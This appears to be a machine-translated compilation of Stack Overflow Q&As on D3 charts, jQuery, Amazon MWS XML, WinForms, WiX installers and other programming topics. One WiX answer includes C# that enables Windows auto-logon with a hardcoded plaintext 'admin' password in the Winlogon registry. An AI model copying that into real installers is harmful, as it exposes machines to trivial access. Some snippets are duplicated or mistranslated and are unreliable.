               {"id":114, "time":1360580745797, "userName":"perky", "activity":"caught pacman"},
               {"id":114, "time":1361580745797, "userName":"perky", "activity":"caught pacman"},
               {"id":114, "time":1362580745797, "userName":"perky", "activity":"caught pacman"},
               {"id":114, "time":1363580745797, "userName":"perky", "activity":"caught pacman"},
               {"id":110, "time":1361580745797, "userName":"pinky", "activity":"respawn"},
               {"id":115, "time":1360580745797, "userName":"clyde", "activity":"respawn"}]

var margin = {top: 20, right: 80, bottom: 30, left: 50},
    width = 960 - margin.left - margin.right,
    height = 500 - margin.top - margin.bottom;

var x = d3.time.scale()
    .range([0, width]);

var y = d3.scale.linear()
    .range( [height,0] );

var xAxis = d3.svg.axis()
    .scale(x)
    .orient("bottom");

var yAxis = d3.svg.axis()
    .scale(y)
    .orient("left");

var color = d3.scale.category10();

var svg = d3.select("body").append("svg")
    .attr("width", width + margin.left + margin.right)
    .attr("height", height + margin.top + margin.bottom)
    .append("g")
    .attr("transform", "translate(" + margin.left + "," + margin.top + ")");

var dateFormat = d3.time.format("%x");

var nestedData = d3.nest()
    .key(function(d) { return d.activity; })
    .key(function(d) {return dateFormat(new Date(d.time));})
    .entries(dataset);

drawMainGraph();

function drawMainGraph() {

    var line = d3.svg.line()
        .interpolate("linear")
        .x( function(d) {return x(dateFormat.parse(d.key)) } )
        .y( function(d) {return y(d.values.length) } );

    x.domain( d3.extent( dataset, function(d) { return new Date(d.time) } ) );
    y.domain( [ 0, d3.max( nestedData, function(d) { return d.values.length } ) ]);

    svg.append("g")
        .attr("class", "x axis")
        .attr("transform", "translate(0," + height + ")")
        .call(xAxis);

    svg.append("g")
        .attr("class", "y axis")
        .call(yAxis)
      .append("text")
        .attr("transform", "rotate(-90)")
        .attr("y", 6)
        .attr("dy", ".71em")
        .style("text-anchor", "end")
        .text("Count");

    var activityLine = svg.selectAll(".activity")
      .data( nestedData )
      .enter()
        .append("g")
        .attr("class", "activity")
        .attr("id", function(d) { return "activity-" + d.key } );

    activityLine.append("path")
      .attr("class", "line")
      .attr("d", function(d) { return line(d.values); } )
      .style("stroke", function(d) { return color(d.key); } );
}

</script>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T16:57:19.243

我处理的是对象而不是值数组这一事实导致了一些复杂性。

主要问题之一是准确获取最小值和最大值。对我的数据进行排序后，我可以使用以下方法解决这个问题：

```
var min = d3.min(nestedData, function(datum) {
    return d3.min(datum.values, function(d) { return d.values.length; });
}),
max = d3.max(nestedData, function(datum) {
    return d3.max(datum.values, function(d) { return d.values.length; });
}); 
```

我遇到的另一个问题是我正在处理的数据并不总是存在。随着新活动被添加到我连接到的 Web 应用程序中，折线图需要能够处理从沿 x 轴的点开始的数据。

我现在使用来自@cmonkey 的一些代码让它工作了

它似乎可以处理我扔给它的任何数量的数据。通过一小部分数据，它看起来有点像这样：

![在此处输入图像描述](../Images/22f927ce6d429004354b185228ea45b3.png)

嵌套步骤是处理放大到特定时间段。我目前显示所有活动（可以追溯到大约 4 个月），因此为了使图表更有用，我需要能够选择特定的月份或星期。

# javascript - 在特定按键上运行功能

> ID：14977681
> 
> 赞同：-3
> 
> 时间：2013-02-20T10:34:14.403
> 
> 标签：javascript, jquery

我试图编写一个 jquery 脚本，当我按下 x 键时，该脚本在标识为 myDiv 的元素上执行 fadeIn()。

```
function showKeyCode(e) {
   //alert( "keyCode for the key pressed: " + e.keyCode + "\n" );
   $if(e.keycode == 88){$("#myDiv").fadeIn();
} 
```

需要注意的点。当我允许警报 x 显示密钥代码 88

此代码不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:36:39.477

当您按下键“X”时，这有效：

```
$(document).ready(function() {
    var mydiv = $('.mydiv');
    $(document).bind('keydown',function(e){
       if(e.keyCode == 88) {
          mydiv.fadeIn();
       }
    });
}); 
```

演示：http: [//jsfiddle.net/TWm6r/](http://jsfiddle.net/TWm6r/)

我使用了一个类，但使用 ID 不会有任何问题

# python - 如何检查是否有人更改了实体数据

> ID：14977687
> 
> 赞同：1
> 
> 时间：2013-02-20T10:34:31.817
> 
> 标签：python, google-app-engine

例如，所有用户均可编辑的所有“交易表”实体。我如何检查，是否有人更改和更新了同一个实体？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:04:58.143

如果我正确理解了您的问题，您要确保如果两个人正在编辑同一个实体，其中一个人应该无法保存。

首先，为您的所有模型使用此 Base 类是一个好主意，并且这两个属性会自动更新：

```
class Base(ndb.Model):
  created = ndb.DateTimeProperty(auto_now_add=True)
  modified = ndb.DateTimeProperty(auto_now=True) 
```

现在，`modified`在您的模型中拥有该属性有助于发现更新期间是否（由其他人）更改了某些内容：

*   在编辑之前读取`modified`属性并将其存储在`before_modified`
*   在保存之前读取`modified`属性并将其与`before_modified`
*   如果这两个值相同，则可以安全保存，否则通知用户此实体已被其他人更改

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:39:12.517

使用时间戳。如果您正在写入的对象的时间戳与您读取该对象时的时间戳不匹配，则同时已对其进行了修改。

# javascript - 滚动到页面底部时如何加载disqus？

> ID：14977691
> 
> 赞同：6
> 
> 时间：2013-02-20T10:34:57.660
> 
> 标签：javascript, disqus

我看到一些由 jekyll 提供支持的博客使用 disqus 进行评论，并且在您滚动到页面底部之前，评论部分不会加载。

我该如何处理？

我试过这样的事情：

```
<div id="disqus_thread"></div>
<div id="disqus_loader" style="text-align: center">
<button onclick="load_disqus()">Load Disqus Comments</button>
<script>
function load_disqus()
{
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = "http://[YOUR-DISQUS-SHORTNAME].disqus.com/embed.js";
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  var ldr = document.getElementById('disqus_loader');
  ldr.parentNode.removeChild(ldr);
}
</script>
</div> 
```

单击按钮加载disqus。但我想知道当我滚动到页面底部时如何加载它。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-21T17:09:34.317

在[Javascript 的帮助下：如何检测浏览器窗口是否滚动到底部？](https://stackoverflow.com/questions/9439725/javascript-how-to-detect-if-browser-window-is-scrolled-to-bottom)

```
var disqus_loaded = false;

function load_disqus()
{
  disqus_loaded = true;
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = "http://[YOUR-DISQUS-SHORTNAME].disqus.com/embed.js";
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  var ldr = document.getElementById('disqus_loader');
  ldr.parentNode.removeChild(ldr);

}

window.onscroll = function(e) {
    if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight) {
        //hit bottom of page
        if (disqus_loaded==false){ load_disqus() };
    }
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-23T19:08:57.097

为了获得更多的灵活性（需要 jQuery），您可能需要考虑设置一个航点，而不是要求用户一直滚动到底部。

```
$('.end-of-jekyll-post').waypoint(function(direction) {
  load_disqus();
}); 
```

# xml - 亚马逊 MWS 订单确认返回错误 25：我们无法处理 XML 提要，因为一件或多件商品无效

> ID：14977696
> 
> 赞同：3
> 
> 时间：2013-02-20T10:35:08.587
> 
> 标签：xml, xsd, amazon-mws

我在通过亚马逊 MWS 向亚马逊提交订单确认时遇到了一些问题。

我提交的 XML 是：

```
<?xml version="1.0"?>
<AmazonEnvelope 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
    xsi:noNamespaceSchemaLocation="amzn-envelope.xsd">
  <Header>
    <DocumentVersion>1.01</DocumentVersion>
    <MerchantIdentifier>F85S4E7G4FSE98</MerchantIdentifier>
   </Header>
   <MessageType>OrderAcknowledgment</MessageType>
   <Message>
    <MessageID>1</MessageID>
    <OrderAcknowledgment>
      <AmazonOrderID>654-8547853-2598634</AmazonOrderID>
      <MerchantOrderID>658795124</MerchantOrderID>
      <StatusCode>Success</StatusCode>
      <Item>
        <AmazonOrderItemCode>35287489587654</AmazonOrderItemCode>
        <MerchantOrderItemID>587487</MerchantOrderItemID>
        <AmazonOrderItemCode>35287489587655</AmazonOrderItemCode>
        <MerchantOrderItemID>587488</MerchantOrderItemID>
      </Item>
    </OrderAcknowledgment>
  </Message>
</AmazonEnvelope> 
```

提交 XML 时，亚马逊返回的错误是：
错误 25：我们无法处理 XML 提要，因为一件或多件商品无效。请重新提交 Feed。

我按照Amazon 提供的[XML 文档指南创建了 XML。](https://images-na.ssl-images-amazon.com/images/G/02/rainier/help/XML_Documentation_Intl._V158772716_.pdf)

基于[此 Stack Overflow 问题](https://stackoverflow.com/questions/13367842/update-merchant-order-id-in-amazon-marketplace)，多个项目的格式是正确的。

我已经对照 XSD 文件检查了我的数据，并且 XML 似乎有效
[https://images-na.ssl-images-amazon.com/images/G/01/rainier/help/xsd/release_1_9/OrderAcknowledgement.xsd](https://images-na.ssl-images-amazon.com/images/G/01/rainier/help/xsd/release_1_9/OrderAcknowledgement.xsd)
[https:// /images-na.ssl-images-amazon.com/images/G/01/rainier/help/xsd/release_1_9/amzn-base.xsd](https://images-na.ssl-images-amazon.com/images/G/01/rainier/help/xsd/release_1_9/amzn-base.xsd)

我尝试使用 XML XSD 验证器来验证 XML，但它返回错误：
Src-resolve：无法将名称“AmazonOrderID”解析为 A(n)“元素声明”组件。

这个错误对我来说没有多大意义，但我相信它会被返回，因为我无法在验证器中正确引用许多其他 XSC。“AmazonOrderID”的限制位于 amzn-base.xsd 文件中，与我提供的 AmazonOrderID 匹配

```
<xsd:element name="AmazonOrderID">
  <xsd:simpleType>
    <xsd:restriction base="xsd:string">
      <xsd:pattern value="\w{3}-\w{7}-\w{7}"/>
    </xsd:restriction>
  </xsd:simpleType>
</xsd:element> 
```

我尝试按顺序确认单个项目，以防多个项目的结构不正确
我尝试完全删除项目部分，因为我阅读了项目部分有时不需要
我尝试通过我创建的处理所有其他请求成功
我尝试通过亚马逊暂存器提交：[https ://mws.amazonservices.co.uk/scratchpad/index.html](https://mws.amazonservices.co.uk/scratchpad/index.html)

我尝试过的任何方法都没有解决这个问题，我完全没有想法
你能提供的任何帮助将不胜感激

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-22T01:04:48.737

I'm currently trying to get a hold of all necessary XSDs to actually validate MWS files, but with little luck so far. Most validators will choke if a single XSD is missing, even if its contents are not relevant to the file it is currently validating. Amazon sure does make it hard to actually validate stuff- unless I'm missing something obvious.

My interim solution is to use a "crippled" XSD that only links to other XSDs that I actually have a copy of. Using this file is not perfect, but better than nothing. The way these XSDs are nested, anything I can validate with my XSD is actually valid. The only downside is that valid XMLs exist that I cannot validate, that I have to live with.

Using this set of XSDs, I had to make the following changes to your XML in order to pass validation:

1.  Change the MessageType to OrderAcknowledgement (extra "e" after the g. whether you like that spelling may depend on which side of the pond you live, nevertheless the XSD commands that exact spelling)
2.  Change both opening and closing tags to OrderAcknowledgement (same as above)
3.  Splitting that one Item into two (the [StackOverflow question](https://stackoverflow.com/questions/13367842/update-merchant-order-id-in-amazon-marketplace) you linked has it wrong)

(I started writing this answer under the impression of C. M. Serperg-McQueen getting the spelling mixed up... I just read it again, and as it turns out, he was spot on, and I'm should improve my reading skills)

The validator message regarding AmazonOrderID was misleading. It was most probably a result of that validator also missing parts of the XSD.

Just for the sake of completeness. This file passed the (crippled) validation:

```
<?xml version="1.0"?>
<AmazonEnvelope 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
    xsi:noNamespaceSchemaLocation="amzn-envelope.xsd">
  <Header>
    <DocumentVersion>1.01</DocumentVersion>
    <MerchantIdentifier>F85S4E7G4FSE98</MerchantIdentifier>
   </Header>
   <MessageType>OrderAcknowledgement</MessageType>
   <Message>
    <MessageID>1</MessageID>
    <OrderAcknowledgement>
      <AmazonOrderID>654-8547853-2598634</AmazonOrderID>
      <MerchantOrderID>658795124</MerchantOrderID>
      <StatusCode>Success</StatusCode>
      <Item>
        <AmazonOrderItemCode>35287489587654</AmazonOrderItemCode>
        <MerchantOrderItemID>587487</MerchantOrderItemID>
      </Item>
      <Item>
        <AmazonOrderItemCode>35287489587655</AmazonOrderItemCode>
        <MerchantOrderItemID>587488</MerchantOrderItemID>
      </Item>
    </OrderAcknowledgement>
  </Message>
</AmazonEnvelope> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-21T00:06:00.350

您说“我已经根据 XSD 文件检查了我的数据，并且 XML 似乎有效”，但是您提到的两个架构文档都没有声明您的最外层元素（也没有声明其他一些元素，但我不会打扰列表）。Amazon 告诉您的是 XML 实际上是无效的。

那么，您的任务是使用 XSD 验证器找出您提交的文档中的无效内容。为了使这项工作，您需要将验证器指向亚马逊验证器使用的架构文档，或者它们的副本——如果您使用的验证器找不到所有必要的声明（如其错误消息所述） ，那么它不太可能对您有帮助。

对于它的价值，我尝试使用您提到的文档引用的架构文档来验证您的数据（[https://images-na.ssl-images-amazon.com/images/G/01/rainier/help/xsd/ release_1_9/amzn-envelope.xsd](https://images-na.ssl-images-amazon.com/images/G/01/rainier/help/xsd/release_1_9/amzn-envelope.xsd)），但文档 Amazon.xsd 和 MaterialHandling.xsd（由 Product.xsd 依次包含）似乎不是相关参考建议的位置。因此，从 Amazon 模式文档中整合一个工作模式可能需要比人们预期的更多的功课。

据我所知，您的 XML 文档的直接问题是：

*   MessageType 的内容拼写为“OrderAcknowledgement”而不是“OrderAcknowledgement”。
*   MessageType 之后的元素名为 OrderAcknowledgement；我猜你的意思是 OrderAcknowledgement。
*   您的 Item 元素有多个订单商品代码，而不仅仅是一个；我想你的意思是

    ```
    <Item>
      <AmazonOrderItemCode>35287489587654</AmazonOrderItemCode>
      <MerchantOrderItemID>587487</MerchantOrderItemID>
    </Item>
    <Item>
      <AmazonOrderItemCode>35287489587655</AmazonOrderItemCode>
      <MerchantOrderItemID>587488</MerchantOrderItemID>
    </Item> 
    ```

祝你好运。

# c# - 如何从datagridview的一列中读取数据

> ID：14977697
> 
> 赞同：10
> 
> 时间：2013-02-20T10:35:08.617
> 
> 标签：c#, winforms, datagridview

我想从 datagridview 的一列中读取数据。我的 datagridview 包含许多列，但我想读取所有单元格，但只能从一列中读取。我使用以下代码阅读了所有列：

```
foreach (DataGridViewColumn col in dataGridView1.Columns)
        col.Name.ToString(); 
```

但我想从特定列中读取所有单元格。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-02-20T10:39:25.413

尝试这个

```
string data = string.Empty;
int indexOfYourColumn = 0;
foreach (DataGridViewRow row in dataGridView1.Rows)
   data = row.Cells[indexOfYourColumn].Value; 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2013-02-20T10:46:39.490

也许这也有帮助。要获得一个单元格：

```
string data = (string)DataGridView1[iCol, iRow].Value; 
```

然后你可以简单地循环行和列。

[文档](http://msdn.microsoft.com/ru-ru/library/ms158656.aspx?cs-save-lang=1&cs-lang=csharp#code-snippet-2)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-20T11:08:06.010

尝试这个

```
foreach (DataGridViewRow row in dataGridView1.Rows)
        {
            foreach (DataGridViewCell cell in row.Cells)
            {
                if (cell.ColumnIndex == 0) //Set your Column Index
                {
                //DO your Stuff here..
                }
            }
         } 
```

或其他方式

```
 foreach (DataGridViewColumn col in dataGridView1.Columns)
            {
                if (col.Name == "MyColName")
                {
               //DO your Stuff here..
                }
            } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-06-27T14:19:15.703

**FOREACH 循环**

```
string data = string.Empty;
string data = string.Empty;
int indexOfYourColumn = 0;
int indexOfYourColumn = 0;
foreach (DataGridViewRow row in dataGridView1.Rows)
foreach (DataGridViewRow row in dataGridView1.Rows)
   data = row.Cells[indexOfYourColumn].Value; 
```

**FOR循环**

```
using System.Collections;

string data = string.Empty;
int indexOfYourColumn = 0;

IList list = dataGridView1.Rows;

for (int i = 0; i < list.Count; i++)
{
  DataGridViewRow row = (DataGridViewRow)list[i];
   data = row.Cells[indexOfYourColumn].Value;
  data = Convert.ToDecimal(row.Cells[indexOfYourColumn].Value);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-07-12T15:56:55.993

要获取单击的单元格的值：

```
private void dataGridView1_CellClick(object sender, DataGridViewCellEventArgs e)
    {
        textBox1.Text = dataGridView1[e.ColumnIndex, e.RowIndex].Value.ToString();
    } 
```

# database - 具有下拉列表支持的用户定义字段的设计模式

> ID：14977702
> 
> 赞同：1
> 
> 时间：2013-02-20T10:35:25.607
> 
> 标签：database, database-design, drop-down-menu, user-defined-fields

我有一个支持我的客户表的用户定义字段的应用程序，我已经有了这样的东西：

```
CustomFields table

    Id            Name                  DataType
    --------------------------------------------
    1             Hobbies               1
    2             Number of Siblings    3 
```

上表显示了一个包含在应用程序范围内使用的 UDF 的表。DataType 列中的值转换为如下所示：

```
1: string
2: DateTime
3: Integer 
```

下表包含 UDF 的值

```
CustomFieldsValues table

CustomerId      FieldId     StringValue       NumericValue      DateValue
1234            1           Fishing           NULL              NULL           
1234            2           NULL              6                 NULL
8834            1           Golfing           NULL              NULL           
8834            2           NULL              2                 NULL 
```

现在，我想介绍一个新的“DataType”

```
4: DropDownList 
```

这本质上类似于`string`数据类型，只是我不会呈现一个文本框，而是有一个下拉列表，其中的值将由管理员添加。

我现在能想到的就是再有一张桌子

```
FieldDropDownList table

FieldId         DropDownItem
1               Fishing
1               Golf
1               Swimming  
2               Random value #1
2               Random value #2
3               Random value #3 
```

并且所有数据类型为 4 的自定义字段的值都将保存在表格的列`StringValue`中`CustomFieldsValues`

有什么建议，我应该考虑吗？

实现下拉列表 UDF 的最有效方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T05:15:04.787

> 有什么建议，我应该考虑吗？

是的。重新开始，让 DBMS 完成工作！该`DataType`列是一个警告，表明有问题。DBMS 提供类型、类型安全和类型转换。

将 UDF 分成`CustomIntFields`、`CustomStrFields`和`CustomDateFields`. 如果需要最后一个，您可以将它们表示为单个视图，使用`UNION`：

```
create view CustomFields as 
select 's' as type, FieldID, Name from CustomStrFields UNION
select 'i' as type, FieldID, Name from CustomIntFields UNION
select 'd' as type, FieldID, Name from CustomDateFields; 
```

只是对于初学者，这将让 DBMS 代表您确保日期有日期，整数有数字。

表`DropDowns`变成

```
create table DropDowns
  ( DropDownID int  -- indicating the widget
  , type char(1) 
  , FieldID int
  ); 
```

引用三个 UDF 表的并集。

这种设计允许添加字段而不会自动出现在下拉列表中，这可能不是您想要的。如果每个字段都应该只出现在一个特定的下拉列表中，则下拉 ID 可以添加到三个字段表中，并且所有内容都从视图中驱动。

> 什么是最有效的方法

这些东西都是非常静态和小的。我很难相信效率会成为问题。但我确实认为，按照预期的方式使用 DBMS，程序员和客户的满意度会更高。:-)

# selenium - 下载 zip 文件并验证其内容

> ID：14977709
> 
> 赞同：0
> 
> 时间：2013-02-20T10:35:39.087
> 
> 标签：selenium, download

我需要选择一个表记录并单击下载按钮。（我猜下载按钮有一个 .js 来下载所选表记录下的文件）它将以 .tbz 格式将文件存储在操作系统中。一旦出现提示，打开 tar 文件并验证其内容。

我设法单击表格记录并单击下载按钮。但它会打开一个下载窗口，在 selenium 中无法识别。可下载的文件位于 web 层下，无法使用 href 对其进行跟踪。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:17:38.903

Selenium/Webdriver 只能与浏览器交互。因此，您无法执行验证 tar 内容的部分。但是，您可能会尝试以您选择的语言查找库，这可能会帮助您解压缩 tar 文件并进行验证。如果有帮助，请提供链接（[如何在 Java 中提取 tar 文件？](https://stackoverflow.com/questions/315618/how-do-i-extract-a-tar-file-in-java)）

回到浏览器部分，您无法与下载窗口进行交互，因为它本身就是一个操作系统级别的窗口。您可以尝试做的事情是，在您正在测试的浏览器中设置下载设置并进行设置，以便自动下载到特定文件夹，您可以从该文件夹继续执行非硒实现。

# wix - 如何在 x64 平台上使用 WIX x86 安装程序安装 VS 帮助？

> ID：14977712
> 
> 赞同：2
> 
> 时间：2013-02-20T10:35:43.237
> 
> 标签：wix, windows-installer, platform

我一直在努力使用 WIX 安装 CAB 帮助文件（从 MSHC 生成）。我尝试遵循的基本配方是这里的：[Installing Help with Help Library Manager and WiX](https://stackoverflow.com/questions/4627758/installing-help-with-help-library-manager-and-wix)。

在我的特殊情况下，我并没有真正为配方而苦苦挣扎，而是在 x64/x86 目标上苦苦挣扎。我已经阅读了来自[WiX 技巧和提示](https://stackoverflow.com/questions/471424/wix-tricks-and-tips/577793)的 WIX 提示，它们描述了如何制作 2 个安装程序，每个目标一个。然而，由于我更喜欢​​只有一个安装程序而不是 2 个，所以我选择只实现一个 x86 目标。

当我使用 x64 平台安装时，一切正常。当我尝试为 x86 做同样的事情时，它抱怨它找不到`HelpLibManager.exe`. 仔细观察，这似乎是合理的，因为它安装在 64 位`C:\Program Files\Microsoft Help Viewer\v1.0\HelpLibManager.exe`，而 WIX 使用 x86 文件夹`C:\Program Files (x86)\Microsoft Help Viewer\v1.0\HelpLibManager.exe`。

为了解决这个问题，我尝试从包含安装 HelpLibManager 的注册表中读取正确的路径：

```
<Property Id="HELPLIB">
  <RegistrySearch Id="HelpLib"
                  Root="HKLM"
                  Key="Software\Microsoft\Help\v1.0"
                  Name="AppRoot"
                  Type="raw" />
</Property>

<SetProperty Id="HELPLIBMANAGER"
         Value="[HELPLIB]HelpLibManager.exe"
         After="InstallInitialize"
         Sequence="execute"/> 
```

当您查看注册表时，（`Wow6432Node`当然是在），它告诉我这个键的值是：`c:\Program Files\Microsoft Help Viewer\v1.0\`- 这是正确的。但是，当我查看 MSI 的日志时，它显示为`"C:\Program Files (x86)\Microsoft Help Viewer\v1.0\HelpLibManager.exe"`，这是不正确的：

```
Property(S): HELPLIB = C:\Program Files (x86)\Microsoft Help Viewer\v1.0\ 
```

显然，Wix 更改了我从注册表中读取的字符串值。

谁能向我解释解决这个问题的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-21T10:09:08.690

重定向到 (x86) 文件夹是由 Windows Installer 自动完成的，而不是由 WiX 完成的。如果您也使用[其他设置创作工具](http://en.wikipedia.org/wiki/Windows_Installer#Tools)创建包，也会发生同样的情况。

不幸的是，32 位安装程序无法写入 x64 机器上的“Program Files”文件夹。在安装过程中，来自操作系统的 WOW 重定向控制了这一点。

要直接在 HKLM\Software 下而不是在 HKLM\Software\Wow6432Node 下创建注册表项，您只需将其组件标记为 64 位即可。不幸的是，这对文件不起作用，即即使文件的组件被标记为 64 位，操作系统仍将重定向 Program Files (x86) 下的所有文件和文件夹。

**编辑：**

> 我最惊讶的是从注册表中读取的字符串值正在被更改（请参阅转储的属性值）

我知道，当我第一次发生这种情况时，我也很惊讶。

要从该文件夹启动文件，您仍然有机会使用一个小技巧，如果您编写一个[小的自定义操作 C#，并将 DLL 作为输出](http://www.advancedinstaller.com/user-guide/qa-c-sharp-ca.html)。您可以在自定义操作中获取搜索的值，对其进行解析，如果存在，手动删除“（x86）”部分。然后[暂时禁用 WOW 重定向](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365743%28v=vs.85%29.aspx)，启动文件，然后重新启用 WOW 重定向。

不要忘记在自定义操作上设置条件，仅设置 VersionNT64 属性，并且仅在安装时运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-24T07:40:41.757

我想用一个例子来完成 Bogdan Mitrache 的回答。为此，我使用 C# 自定义操作来访问注册表并控制 WOW 行为。

```
public partial class CustomActions
    {

        #region marshalling RegCreateKeyEx RegOpenKeyEx RegCloseKey RegSetValueEx
        [Flags]
        public enum RegOption
        {
            NonVolatile = 0x0,
            Volatile = 0x1,
            CreateLink = 0x2,
            BackupRestore = 0x4,
            OpenLink = 0x8
        }

        [Flags]
        public enum RegSAM
        {
            QueryValue = 0x0001,
            SetValue = 0x0002,
            CreateSubKey = 0x0004,
            EnumerateSubKeys = 0x0008,
            Notify = 0x0010,
            CreateLink = 0x0020,
            WOW64_32Key = 0x0200,
            WOW64_64Key = 0x0100,
            WOW64_Res = 0x0300,
            Read = 0x00020019,
            Write = 0x00020006,
            Execute = 0x00020019,
            AllAccess = 0x000f003f
        }

        public enum RegResult
        {
            CreatedNewKey = 0x00000001,
            OpenedExistingKey = 0x00000002
        }

        //[StructLayout(LayoutKind.Sequential)]
        //public class SECURITY_ATTRIBUTES
        //{
        //    public int nLength;
        //    public unsafe byte* lpSecurityDescriptor;
        //    public int bInheritHandle;
        //}
        [StructLayout(LayoutKind.Sequential)]
        public class SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int RegCreateKeyEx(
                    RegistryHive hKey,
                    string lpSubKey,
                    int Reserved,
                    string lpClass,
                    RegOption dwOptions,
                    RegSAM samDesired,
                    SECURITY_ATTRIBUTES lpSecurityAttributes,
                    out UIntPtr phkResult,
                    out RegResult lpdwDisposition);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "RegOpenKeyEx")]
        static extern int RegOpenKeyEx(
            RegistryHive hKey,
            string subKey,
            uint options,
            RegSAM sam,
            out UIntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int RegCloseKey(
            UIntPtr hKey);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern uint RegSetValueEx(
             UIntPtr hKey,
             [MarshalAs(UnmanagedType.LPStr)]
     string lpValueName,
             int Reserved,
             RegistryValueKind dwType,
             [MarshalAs(UnmanagedType.LPStr)] string lpData,
             int cbData);

        const int KEY_WOW64_64KEY = 0x0100;
        const int KEY_READ = 0x20019;

        #endregion

   private static uint WriteValue_String(UIntPtr hKey, string sName, string sValue)
        {
            uint setRes = RegSetValueEx(hKey, sName, 0, Microsoft.Win32.RegistryValueKind.String, sValue, sValue.Length + 1);
            return setRes;
        }

        /// <summary>
        /// Enable AutoLogon by changing the values of the system registry keys "DefaultUserName", "DefaultPassword" and "AutoAdminLogon" 
        /// in "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        /// </summary>
        /// <param name="session"></param>
        /// <returns></returns>
        [CustomAction]
        public static ActionResult EnableAutoLogon(Session session)
        {
            _session = session;
            LogUtil.WriteDebugInfo(session, "Enter Function");
            try
            {

                SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();

                UIntPtr hKey;
                RegResult regResult;

                LogUtil.WriteDebugInfo(session, "RegOpenKeyEx");
                int result = RegOpenKeyEx(
                    RegistryHive.LocalMachine,
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                    0, //must be 0
                    RegSAM.WOW64_64Key | RegSAM.SetValue,
                    out hKey);

                LogUtil.WriteDebugInfo(session, "WriteValue_String");
                uint setRes = WriteValue_String(hKey, "DefaultUserName", "admin");
                setRes = WriteValue_String(hKey, "DefaultPassword", "admin");
                setRes = WriteValue_String(hKey, "AutoAdminLogon", "1");

                LogUtil.WriteDebugInfo(session, "RegCloseKey");
                int closeRes = RegCloseKey(hKey);           
            }
            catch (System.Exception ex)
            {
                LogUtil.WriteDebugInfo(session, "Exception occured : " + ex.Message + "\n" + ex.StackTrace);
                LogUtil.WriteDebugInfo(session, "Exit Function");
                return ActionResult.Failure;
            }
            LogUtil.WriteDebugInfo(session, "Exit Function");
            return ActionResult.Success;
        }
 } 
```

> KEY_WOW64_32KEY (0x0200) 表示 64 位 Windows 上的应用程序应在 32 位注册表视图上运行。32 位 Windows 忽略此标志。有关详细信息，请参阅访问备用注册表视图。
> 
> 此标志必须使用 OR 运算符与此表中查询或访问注册表值的其他标志组合。
> 
> Windows 2000：不支持此标志。
> 
> KEY_WOW64_64KEY (0x0100) 表示 64 位 Windows 上的应用程序应在 64 位注册表视图上运行。32 位 Windows 忽略此标志。有关详细信息，请参阅访问备用注册表视图。
> 
> 此标志必须使用 OR 运算符与此表中查询或访问注册表值的其他标志组合。
> 
> Windows 2000：不支持此标志。

# c# - string.Format 带大括号的错误

> ID：14977714
> 
> 赞同：3
> 
> 时间：2013-02-20T10:35:45.997
> 
> 标签：c#, string-formatting

我正在尝试构建一个包含两部分字符串的字符串，它会出错.....这是我下面的代码

```
 StringBuilder str = new StringBuilder();          
            str.AppendFormat("{0}",GetAccessor(attr, rootTblName)).AppendLine();                
            str.Append("}").AppendLine();

            return str.ToString();

 private string GetAccessor(DataAttribute attr, string rootTblName)
        {
            return string.Format("get { return {0}.{1}; }", 
                GetRootPvtMember(rootTblName), 
                attr.MdlPart.InternalName
            );
        } 
```

错误：输入字符串格式无效.......它失败我的意思是由于GetAccessor返回字符串中的“{”，“}”而导致错误，但我需要它们。所以任何工作都请......

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-20T10:37:55.140

使用双大括号`{{`来转义 Format 中的花括号。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-20T10:37:25.200

`{{`用和转义它们`}}`。

然后它将起作用。

例如：

```
string.Format("get {{ return {0}.{1}; }}", .... 
```

# c - IPC msgrcv - 只接收两种特定类型的消息

> ID：14977723
> 
> 赞同：1
> 
> 时间：2013-02-20T10:36:12.750
> 
> 标签：c, linux, ipc, msgrcv

我有问题。

我有一个进程，假设它是一个客户端，还有一个称为服务器的进程。客户端和服务器通过同一个队列相互通信。假设客户端向服务器发送消息（请求），因此服务器对其进行处理并应将消息发送回客户端确认或失败。假设确认有`long type = 1500101`，失败有`long type = 1500102`。

是否有可能（在 C 中使用 msgrcv）只等待这两种类型的消息（客户端）？如果不是，那么实现这种机制的最佳方法是什么？

* * *

